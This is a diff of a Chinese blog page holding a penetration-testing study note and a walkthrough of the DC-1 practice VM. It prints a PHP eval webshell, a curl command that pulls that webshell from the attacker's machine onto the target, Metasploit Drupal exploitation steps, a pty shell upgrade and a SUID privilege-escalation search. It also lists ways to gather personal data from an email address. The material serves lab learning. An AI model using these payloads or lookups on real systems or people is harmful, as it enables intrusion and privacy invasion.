@@ -239,14 +239,14 @@
         </center>
     </div>
     <div class="content-article">
-        <h1 id="一-基本流程："><a href="#一-基本流程：" class="headerlink" title="一.基本流程："></a>一.基本流程：</h1><p>渗透整体分为三部分：<br>前渗透也被称为外网打点，权限维持以及后渗透，权限维持也可划分到前渗透中。<br>权限维持也包括提权，主机信息收集<br>web打点，apk打点(安卓手机打点)，钓鱼等等最终目的都是为了获得权限。<br>结构示意图：<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240107172544170.png" alt="image-20240107172544170"></p>
-<h1 id="二-web打点"><a href="#二-web打点" class="headerlink" title="二.web打点"></a>二.web打点</h1><p>信息收集分情况进行处理：已知ip，已知域名，已知邮箱。</p>
-<h2 id="2-1已知ip"><a href="#2-1已知ip" class="headerlink" title="2.1已知ip"></a>2.1已知ip</h2><h3 id="2-1-1基于主机"><a href="#2-1-1基于主机" class="headerlink" title="2.1.1基于主机"></a>2.1.1基于主机</h3><p>可以进行端口扫描，从而确定端口对应的服务，一共有65536(0~65535)个端口。浏览器也是如此，在浏览器上每开启一个页面都要在本地建立端口于远端服务器进行连接。<br>在web服务(浏览器)上就可以进行目录扫描，通过目录扫描发现信息泄露，如果没有进行校验还会发生越权或者目录穿越。web服务上面还会发现ssh，ftp，smb，RDP，寻找API(可能存在is之中)，根据ico图标找相关站点等服务，其中的密码都可以进行爆破。简单的用户名和密码，组织统一注册的用户名和密码，历史密码拼接容易被爆破。还可以进行强制爆破。以上种种情况基于主机。</p>
-<h3 id="2-1-2反查"><a href="#2-1-2反查" class="headerlink" title="2.1.2反查"></a>2.1.2反查</h3><p>根据ip地址反查域名<br>通过微步在线进行反查<br>通过在微步进行服务器ip地址的查询可以看到绑定的图标以及ip解析的域名，相关网站，网页的js以及ip开饭的端口等信息均可以查到。<br>根据图标也可能会被查到相关信息。<br><a target="_blank" rel="noopener" href="https://x.threatbook.com/v5/circleIntroduction">微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区</a></p>
-<h3 id="2-1-3ip定位"><a href="#2-1-3ip定位" class="headerlink" title="2.1.3ip定位"></a>2.1.3ip定位</h3><h2 id="2-2已知域名"><a href="#2-2已知域名" class="headerlink" title="2.2已知域名"></a>2.2已知域名</h2><h3 id="2-2-1域名："><a href="#2-2-1域名：" class="headerlink" title="2.2.1域名："></a>2.2.1域名：</h3><p>例如：<a target="_blank" rel="noopener" href="http://www.baidu.com就是域名/">www.baidu.com就是域名</a><br>    域名（Domain Name）是用于在互联网上标识和定位网站或互联网资源的人类可读的地址。它是将IP地址（用于在网络上唯一标识设备）转化为易于记忆的字符序列的方式。<br>域名的结构通常由多个部分组成，以点（.）作为分隔符。最顶层的部分被称为顶级域名（Top-Level Domain，简称TLD），如.com、.org、.net等。顶级域名可以按照国家&#x2F;地区（如.cn表示中国）、通用（如.com表示商业）、组织类型（如.edu表示教育机构）等进行分类。<br>    在顶级域名下面，可以添加二级域名和更多级别的子域名。<br>    域名的作用是方便用户记忆和使用，它提供了一个更友好和可读性更高的方式来访问网站和互联网资源，而不是依赖于记忆一长串数字的IP地址。当用户在浏览器中输入域名时，系统将通过域名解析将其转换为相应的IP地址，以便正确访问目标资源。</p>
-<h3 id="2-2-2域名备案"><a href="#2-2-2域名备案" class="headerlink" title="2.2.2域名备案"></a>2.2.2域名备案</h3><p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a>通过这个地址查看域名备案<br><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">https://beian.miit.gov.cn/#/Integrated/index</a><br>通过域名备案可以查到邮箱，姓名，主体，服务备案号，通过备案号可以查其他相关网站。<br>通过备案号加上引号进行百度搜索</p>
-<h2 id="2-3已知邮箱"><a href="#2-3已知邮箱" class="headerlink" title="2.3已知邮箱"></a>2.3已知邮箱</h2><p><a target="_blank" rel="noopener" href="https://www.reg007.com/">https://www.reg007.com/</a>通过这个网站搜索邮箱，手机号可以看到注册过的一些相关网页或者应用，不过比较鸡肋的是必须证明是本人进行查询，还需要发送验证码。<br><a target="_blank" rel="noopener" href="https://www.reg007.com/">你注册过哪些网站？一搜便知 - REG007</a><br>已知邮箱可以查询到姓名，手机号，历史密码，身份证，户口本，淘宝记录。</p>
-<h1 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h1><h1 id="一-准备工作："><a href="#一-准备工作：" class="headerlink" title="一.准备工作："></a>一.准备工作：</h1><p>1.准备好DC1靶机和kali linux虚拟机两台设。<br>2.由于一开始不知道DC1靶机的ip地址，可以将两台设备调整为nat模式，对DC1进行查看物理地址并记录下来</p>
+        <h1><span id="一基本流程">一.基本流程：</span></h1><p>渗透整体分为三部分：<br>前渗透也被称为外网打点，权限维持以及后渗透，权限维持也可划分到前渗透中。<br>权限维持也包括提权，主机信息收集<br>web打点，apk打点(安卓手机打点)，钓鱼等等最终目的都是为了获得权限。<br>结构示意图：<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240107172544170.png" alt="image-20240107172544170"></p>
+<h1><span id="二web打点">二.web打点</span></h1><p>信息收集分情况进行处理：已知ip，已知域名，已知邮箱。</p>
+<h2><span id="21已知ip">2.1已知ip</span></h2><h3><span id="211基于主机">2.1.1基于主机</span></h3><p>可以进行端口扫描，从而确定端口对应的服务，一共有65536(0~65535)个端口。浏览器也是如此，在浏览器上每开启一个页面都要在本地建立端口于远端服务器进行连接。<br>在web服务(浏览器)上就可以进行目录扫描，通过目录扫描发现信息泄露，如果没有进行校验还会发生越权或者目录穿越。web服务上面还会发现ssh，ftp，smb，RDP，寻找API(可能存在is之中)，根据ico图标找相关站点等服务，其中的密码都可以进行爆破。简单的用户名和密码，组织统一注册的用户名和密码，历史密码拼接容易被爆破。还可以进行强制爆破。以上种种情况基于主机。</p>
+<h3><span id="212反查">2.1.2反查</span></h3><p>根据ip地址反查域名<br>通过微步在线进行反查<br>通过在微步进行服务器ip地址的查询可以看到绑定的图标以及ip解析的域名，相关网站，网页的js以及ip开饭的端口等信息均可以查到。<br>根据图标也可能会被查到相关信息。<br><a target="_blank" rel="noopener" href="https://x.threatbook.com/v5/circleIntroduction">微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区</a></p>
+<h3><span id="213ip定位">2.1.3ip定位</span></h3><h2><span id="22已知域名">2.2已知域名</span></h2><h3><span id="221域名">2.2.1域名：</span></h3><p>例如：<a target="_blank" rel="noopener" href="http://www.baidu.com就是域名/">www.baidu.com就是域名</a><br>    域名（Domain Name）是用于在互联网上标识和定位网站或互联网资源的人类可读的地址。它是将IP地址（用于在网络上唯一标识设备）转化为易于记忆的字符序列的方式。<br>域名的结构通常由多个部分组成，以点（.）作为分隔符。最顶层的部分被称为顶级域名（Top-Level Domain，简称TLD），如.com、.org、.net等。顶级域名可以按照国家&#x2F;地区（如.cn表示中国）、通用（如.com表示商业）、组织类型（如.edu表示教育机构）等进行分类。<br>    在顶级域名下面，可以添加二级域名和更多级别的子域名。<br>    域名的作用是方便用户记忆和使用，它提供了一个更友好和可读性更高的方式来访问网站和互联网资源，而不是依赖于记忆一长串数字的IP地址。当用户在浏览器中输入域名时，系统将通过域名解析将其转换为相应的IP地址，以便正确访问目标资源。</p>
+<h3><span id="222域名备案">2.2.2域名备案</span></h3><p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a>通过这个地址查看域名备案<br><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">https://beian.miit.gov.cn/#/Integrated/index</a><br>通过域名备案可以查到邮箱，姓名，主体，服务备案号，通过备案号可以查其他相关网站。<br>通过备案号加上引号进行百度搜索</p>
+<h2><span id="23已知邮箱">2.3已知邮箱</span></h2><p><a target="_blank" rel="noopener" href="https://www.reg007.com/">https://www.reg007.com/</a>通过这个网站搜索邮箱，手机号可以看到注册过的一些相关网页或者应用，不过比较鸡肋的是必须证明是本人进行查询，还需要发送验证码。<br><a target="_blank" rel="noopener" href="https://www.reg007.com/">你注册过哪些网站？一搜便知 - REG007</a><br>已知邮箱可以查询到姓名，手机号，历史密码，身份证，户口本，淘宝记录。</p>
+<h1><span id="打靶">打靶</span></h1><h1><span id="一准备工作">一.准备工作：</span></h1><p>1.准备好DC1靶机和kali linux虚拟机两台设。<br>2.由于一开始不知道DC1靶机的ip地址，可以将两台设备调整为nat模式，对DC1进行查看物理地址并记录下来</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">DC1的mac地址：<span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">0</span>D:<span class="hljs-number">49</span>:<span class="hljs-number">7</span>C<br></code></pre></td></tr></table></figure>
 
 <p>3.kali linux虚拟机通过ifconfig找到当前的ip地址</p>
@@ -256,19 +256,19 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">命令：namp -sn <span class="hljs-number">192.168</span>.<span class="hljs-number">17.132</span>/<span class="hljs-number">24</span><br>得出DC1的IP：<span class="hljs-number">192.168</span>.<span class="hljs-number">17.133</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162538816.png" alt="image-20240105162538816"></p>
-<h1 id="二-获取信息："><a href="#二-获取信息：" class="headerlink" title="二.获取信息："></a>二.获取信息：</h1><p>1.通过此命令查看DC1的基本信息：nmap  -sS 192.168.17.133 -A<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162658295.png" alt="image-20240105162658295"><br>2.通过此命令查看DC1的全端口信息：nmap  -p- 192.168.17.133<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162728656.png" alt="image-20240105162728656"><br>3.确定版本：nmap -p 80 -sV 192.168.17.133,由于自己试过无法主机无法到达，因为两个虚拟机都选择的是nat模式所以无法互相拼通。<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162753630.png" alt="image-20240105162753630"><br>再在kali机上面打开浏览器搜索192.168.17.133:80,关键字是:Drupal Site ,用sql注入进行尝试发现没啥用处，邮箱注册发送也没用<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162819371.png" alt="image-20240105162819371"><br>4.进行目录扫描：<br>dirsearch -u 192.168.17.133 -x 403，404 -t 50<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162848717.png" alt="image-20240105162848717"><br>在网页后面加上&#x2F;robots.txt。这个文件是一个爬虫文件。<br>robots.txt 是一个用于指导网络爬虫的文件。它是位于网站根目录下的一个文本文件，用于向搜索引擎和其他网络爬虫提供关于网站爬取规则的指示。<br>当搜索引擎的爬虫访问一个网站时，它会首先查找并读取 robots.txt 文件。该文件中包含了一些指令，告诉爬虫哪些网页可以被爬取，哪些不可以。通过 robots.txt，网站管理员可以控制搜索引擎爬虫在访问网站时的行为，例如禁止爬虫访问某些特定的页面、目录或文件。<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162916832.png" alt="image-20240105162916832"><br>再去看一下&#x2F;UPGRADE.txt可以发现Drupal是一个框架，当前版本是7.0，百度搜索一下，发现版本比较老，可能存在漏洞。</p>
-<h1 id="三-msf尝试进行攻击："><a href="#三-msf尝试进行攻击：" class="headerlink" title="三.msf尝试进行攻击："></a>三.msf尝试进行攻击：</h1><p>启动msf:msfconsole<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163357150.png" alt="image-20240105163357150"><br>搜索框架漏洞：search drupal<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163437207.png" alt="image-20240105163437207"><br>发现存在这些漏洞，一个个进行尝试，最后发现第二个能够成功。<br>尝试用use 0会话没有创建成功，用use 2成功创建会话。<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163719291.png" alt="image-20240105163719291"><br>show options查看必须要设置的选项<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163803062.png" alt="image-20240105163803062"><br>set rhosts <strong>192.168.17.133#这个ip是DC1的ip</strong><br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163817424.png" alt="image-20240105163817424"><br>run一下出现这个说明伪终端创建成功。<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163830169.png" alt="image-20240105163830169"></p>
-<h1 id="四-尝试提权："><a href="#四-尝试提权：" class="headerlink" title="四.尝试提权："></a>四.尝试提权：</h1><p>shell一下，ls查看一下：</p>
+<h1><span id="二获取信息">二.获取信息：</span></h1><p>1.通过此命令查看DC1的基本信息：nmap  -sS 192.168.17.133 -A<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162658295.png" alt="image-20240105162658295"><br>2.通过此命令查看DC1的全端口信息：nmap  -p- 192.168.17.133<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162728656.png" alt="image-20240105162728656"><br>3.确定版本：nmap -p 80 -sV 192.168.17.133,由于自己试过无法主机无法到达，因为两个虚拟机都选择的是nat模式所以无法互相拼通。<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162753630.png" alt="image-20240105162753630"><br>再在kali机上面打开浏览器搜索192.168.17.133:80,关键字是:Drupal Site ,用sql注入进行尝试发现没啥用处，邮箱注册发送也没用<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162819371.png" alt="image-20240105162819371"><br>4.进行目录扫描：<br>dirsearch -u 192.168.17.133 -x 403，404 -t 50<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162848717.png" alt="image-20240105162848717"><br>在网页后面加上&#x2F;robots.txt。这个文件是一个爬虫文件。<br>robots.txt 是一个用于指导网络爬虫的文件。它是位于网站根目录下的一个文本文件，用于向搜索引擎和其他网络爬虫提供关于网站爬取规则的指示。<br>当搜索引擎的爬虫访问一个网站时，它会首先查找并读取 robots.txt 文件。该文件中包含了一些指令，告诉爬虫哪些网页可以被爬取，哪些不可以。通过 robots.txt，网站管理员可以控制搜索引擎爬虫在访问网站时的行为，例如禁止爬虫访问某些特定的页面、目录或文件。<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105162916832.png" alt="image-20240105162916832"><br>再去看一下&#x2F;UPGRADE.txt可以发现Drupal是一个框架，当前版本是7.0，百度搜索一下，发现版本比较老，可能存在漏洞。</p>
+<h1><span id="三msf尝试进行攻击">三.msf尝试进行攻击：</span></h1><p>启动msf:msfconsole<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163357150.png" alt="image-20240105163357150"><br>搜索框架漏洞：search drupal<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163437207.png" alt="image-20240105163437207"><br>发现存在这些漏洞，一个个进行尝试，最后发现第二个能够成功。<br>尝试用use 0会话没有创建成功，用use 2成功创建会话。<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163719291.png" alt="image-20240105163719291"><br>show options查看必须要设置的选项<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163803062.png" alt="image-20240105163803062"><br>set rhosts <strong>192.168.17.133#这个ip是DC1的ip</strong><br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163817424.png" alt="image-20240105163817424"><br>run一下出现这个说明伪终端创建成功。<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163830169.png" alt="image-20240105163830169"></p>
+<h1><span id="四尝试提权">四.尝试提权：</span></h1><p>shell一下，ls查看一下：</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163954148.png" alt="image-20240105163954148"></p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105163919782.png" alt="image-20240105163919782"><br>pwd当前位置，whoami我是谁<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164009490.png" alt="image-20240105164009490"><br>cat flag1.txt<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164018621.png" alt="image-20240105164018621"></p>
-<h2 id="CMS是什么？"><a href="#CMS是什么？" class="headerlink" title="CMS是什么？"></a>CMS是什么？</h2><p>CMS 是内容管理系统（Content Management System）的缩写。它是一种用于创建、编辑、管理和发布内容的软件系统或工具。<br>一个 CMS 提供了一系列的功能和工具，使用户可以轻松地创建、组织和发布内容，无需编写代码或进行复杂的技术操作。它通常包括用户管理、内容编辑、模板设计、发布管理等功能。<br>使用 CMS，用户可以创建和管理各种类型的网站，例如博客、新闻门户、企业网站、电子商务网站等。CMS 提供了易于使用的界面和工具，允许用户通过简单的操作来添加、编辑或删除页面内容、图像、视频、文章等，而无需涉及复杂的编程和设计知识。<br>一些常见的 CMS 包括 WordPress、Drupal、Joomla 等，它们都是广泛用于构建和管理网站的流行软件系统。通过使用 CMS，用户能够方便地管理网站的内容，使网站的维护和更新更加高效和简单。</p>
-<h2 id="上传文件："><a href="#上传文件：" class="headerlink" title="上传文件："></a>上传文件：</h2><p>where curl #curl类似于一个命令行工具或者库<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164044249.png" alt="image-20240105164044249"><br>输入curl出现帮助手册说明存在。<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164055681.png" alt="image-20240105164055681"><br>curl <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a><br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164114568.png" alt="image-20240105164114568"><br>在桌面新建一个1.php</p>
+<h2><span id="cms是什么">CMS是什么？</span></h2><p>CMS 是内容管理系统（Content Management System）的缩写。它是一种用于创建、编辑、管理和发布内容的软件系统或工具。<br>一个 CMS 提供了一系列的功能和工具，使用户可以轻松地创建、组织和发布内容，无需编写代码或进行复杂的技术操作。它通常包括用户管理、内容编辑、模板设计、发布管理等功能。<br>使用 CMS，用户可以创建和管理各种类型的网站，例如博客、新闻门户、企业网站、电子商务网站等。CMS 提供了易于使用的界面和工具，允许用户通过简单的操作来添加、编辑或删除页面内容、图像、视频、文章等，而无需涉及复杂的编程和设计知识。<br>一些常见的 CMS 包括 WordPress、Drupal、Joomla 等，它们都是广泛用于构建和管理网站的流行软件系统。通过使用 CMS，用户能够方便地管理网站的内容，使网站的维护和更新更加高效和简单。</p>
+<h2><span id="上传文件">上传文件：</span></h2><p>where curl #curl类似于一个命令行工具或者库<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164044249.png" alt="image-20240105164044249"><br>输入curl出现帮助手册说明存在。<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164055681.png" alt="image-20240105164055681"><br>curl <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a><br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164114568.png" alt="image-20240105164114568"><br>在桌面新建一个1.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[cmd]);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/1704099768665-38421335-8090-4172-a06f-99ad968ad8c0.png" alt="image.png"><br>重新开一个cmd窗口输入python -m http.server 80#意思是说将当前目录设置为网站根目录。<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164152545.png" alt="image-20240105164152545"><br><a target="_blank" rel="noopener" href="http://192.168.17.132/">http://192.168.17.132</a>  -o 1.php<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164208380.png" alt="image-20240105164208380"><br>ls发现上传成功。</p>
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164238441.png" alt="image-20240105164238441"></p>
 <p>cat 1.php<br>出现其他的内容说明上传的方式错了，上传了个下载连接地址。<br>正确的方式是这样的：<br>curl <a target="_blank" rel="noopener" href="http://192.168.17.132/1.php">http://192.168.17.132/1.php</a> -o 2.php<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164336787.png" alt="image-20240105164336787"><br>cat 2.php<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164404673.png" alt="image-20240105164404673"><br>成功之后调用系统命令执行函数。<br>192.168.17.133&#x2F;2.php?cmd&#x3D;sytem(ls);<br><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164436383.png" alt="image-20240105164436383"><br>通过木马获取权限，这是一种办法。</p>
-<h1 id="五-短暂获取权限："><a href="#五-短暂获取权限：" class="headerlink" title="五.短暂获取权限："></a>五.短暂获取权限：</h1><p>python加强一下shell权限：python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”#使用交互shell</p>
+<h1><span id="五短暂获取权限">五.短暂获取权限：</span></h1><p>python加强一下shell权限：python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”#使用交互shell</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240105164449530.png" alt="image-20240105164449530"><br>find提权：find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null#这里利用SUID进行提权，查看SUID的二进制可执行文件。</p>
@@ -336,6 +336,12 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2024/01/08/sqli%E9%80%9A%E5%85%B3/">sqli通关</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2024/01/08/tg%E6%B3%A8%E5%86%8C%E5%92%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/">tg注册和永恒之黑</a>
                 </span>
             </li>
@@ -388,12 +394,6 @@
                 </span>
             </li>
             
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2023/12/19/sql%E6%B3%A8%E5%85%A51/">sql注入1</a>
-                </span>
-            </li>
-            
         </ul>
     </div>
 </aside>
@@ -412,13 +412,13 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/12/php%E5%AD%A6%E4%B9%A0/">php学习</a>
+                    <a href="/2023/12/13/php%E5%AD%A6%E4%B9%A01/">php学习1</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/16/php%E5%AE%9E%E6%93%8D/">php实操</a>
+                    <a href="/2023/12/06/python%E5%AD%A6%E4%B9%A0/">python学习</a>
                 </span>
             </li>
             
@@ -430,13 +430,7 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/11/python%E5%AD%A6%E4%B9%A02/">python学习2</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2023/12/21/sql%E6%B3%A8%E5%85%A52/">sql注入2</a>
+                    <a href="/2023/12/19/sql%E6%B3%A8%E5%85%A51/">sql注入1</a>
                 </span>
             </li>
             
@@ -448,19 +442,25 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2024/01/01/waf%E5%92%8CBP/">waf和BP</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2024/01/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/10/%E5%AE%89%E5%8D%93%E7%97%85%E6%AF%92%E7%9B%91%E5%90%AC/">安卓病毒监听</a>
+                    <a href="/2023/12/21/sql%E6%B3%A8%E5%85%A52/">sql注入2</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2024/01/02/%E6%B8%97%E9%80%8F%E5%92%8C%E9%9D%B6%E6%9C%BA/">渗透和靶机</a>
+                    <a href="/2023/12/10/%E5%AE%89%E5%8D%93%E7%97%85%E6%AF%92%E7%9B%91%E5%90%AC/">安卓病毒监听</a>
                 </span>
             </li>
             
@@ -499,97 +499,97 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/Linux/" style="font-size: 17.271674352935506px;" class="tag-cloud-link">Linux</a>
+    <a href="/tags/Linux/" style="font-size: 13.839985829883002px;" class="tag-cloud-link">Linux</a>
     
-    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 17.490922504442914px;" class="tag-cloud-link">基础知识</a>
+    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 17.853370324522253px;" class="tag-cloud-link">基础知识</a>
     
-    <a href="/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" style="font-size: 14.054214320728235px;" class="tag-cloud-link">DNS域名解析</a>
+    <a href="/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" style="font-size: 14.021877073691678px;" class="tag-cloud-link">DNS域名解析</a>
     
-    <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 13.454576367782934px;" class="tag-cloud-link">学习</a>
+    <a href="/tags/HTML/" style="font-size: 12.284833530804598px;" class="tag-cloud-link">HTML</a>
     
-    <a href="/tags/HTML/" style="font-size: 14.419472442178847px;" class="tag-cloud-link">HTML</a>
+    <a href="/tags/CSS/" style="font-size: 16.929609488191325px;" class="tag-cloud-link">CSS</a>
     
-    <a href="/tags/CSS/" style="font-size: 17.650038995469735px;" class="tag-cloud-link">CSS</a>
+    <a href="/tags/php/" style="font-size: 13.929017458590806px;" class="tag-cloud-link">php</a>
     
-    <a href="/tags/php/" style="font-size: 12.015570256070312px;" class="tag-cloud-link">php</a>
+    <a href="/tags/php%E5%87%BD%E6%95%B0/" style="font-size: 14.231621650702262px;" class="tag-cloud-link">php函数</a>
     
-    <a href="/tags/php%E5%87%BD%E6%95%B0/" style="font-size: 15.274155158663724px;" class="tag-cloud-link">php函数</a>
+    <a href="/tags/%E7%AE%80%E5%8D%95%E7%BD%91%E7%AB%99%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/" style="font-size: 12.1149687912676px;" class="tag-cloud-link">简单网站功能实现</a>
     
-    <a href="/tags/%E7%AE%80%E5%8D%95%E7%BD%91%E7%AB%99%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/" style="font-size: 11.755256585371608px;" class="tag-cloud-link">简单网站功能实现</a>
+    <a href="/tags/html/" style="font-size: 15.69384069240988px;" class="tag-cloud-link">html</a>
     
-    <a href="/tags/PHP/" style="font-size: 9.385507353049071px;" class="tag-cloud-link">PHP</a>
+    <a href="/tags/postman/" style="font-size: 12.226168150622687px;" class="tag-cloud-link">postman</a>
     
-    <a href="/tags/Navicat/" style="font-size: 13.142573059465526px;" class="tag-cloud-link">Navicat</a>
+    <a href="/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" style="font-size: 15.192934137624295px;" class="tag-cloud-link">文件操作</a>
     
-    <a href="/tags/%E5%AE%89%E8%A3%85/" style="font-size: 14.956412637763389px;" class="tag-cloud-link">安装</a>
+    <a href="/tags/python/" style="font-size: 14.860680556090417px;" class="tag-cloud-link">python</a>
     
-    <a href="/tags/html/" style="font-size: 11.186791506676359px;" class="tag-cloud-link">html</a>
+    <a href="/tags/%E5%8F%98%E9%87%8F/" style="font-size: 9.438842894220835px;" class="tag-cloud-link">变量</a>
     
-    <a href="/tags/postman/" style="font-size: 11.502176209415978px;" class="tag-cloud-link">postman</a>
+    <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 12.623946567768467px;" class="tag-cloud-link">字符串</a>
     
-    <a href="/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" style="font-size: 16.084715335833238px;" class="tag-cloud-link">文件操作</a>
+    <a href="/tags/%E5%88%97%E8%A1%A8/" style="font-size: 19.561344444923826px;" class="tag-cloud-link">列表</a>
     
-    <a href="/tags/python/" style="font-size: 9.815534713428466px;" class="tag-cloud-link">python</a>
+    <a href="/tags/%E5%85%83%E7%BB%84/" style="font-size: 10.34129760012124px;" class="tag-cloud-link">元组</a>
     
-    <a href="/tags/%E5%8F%98%E9%87%8F/" style="font-size: 11.125438379687141px;" class="tag-cloud-link">变量</a>
+    <a href="/tags/if%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD/" style="font-size: 9.396523743553384px;" class="tag-cloud-link">if条件判断</a>
     
-    <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 16.070436166075716px;" class="tag-cloud-link">字符串</a>
+    <a href="/tags/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/" style="font-size: 8.708280759723888px;" class="tag-cloud-link">循环语句</a>
     
